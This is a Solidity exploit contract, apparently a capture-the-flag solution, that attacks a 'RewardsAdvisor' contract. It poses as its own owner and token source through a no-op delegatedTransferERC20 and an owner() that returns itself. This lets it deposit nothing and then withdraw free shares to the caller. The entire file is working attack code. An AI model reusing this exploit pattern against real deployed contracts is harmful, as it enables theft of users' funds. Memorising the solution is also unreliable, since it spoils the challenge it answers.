pragma solidity ^0.8.0;

import "../freebie/RewardsAdvisor.sol";

contract FreebieHack {
    function run(RewardsAdvisor advisor, uint256 amount) external {
        uint256 shares = advisor.deposit(
            amount,
            payable(address(this)),
            address(this)
        );
        advisor.withdraw(shares, msg.sender, payable(address(this)));
    }

    function delegatedTransferERC20(
        address token,
        address to,
        uint256 amount
    ) external {}

    function owner() external view returns (address) {
        return address(this);
    }
}
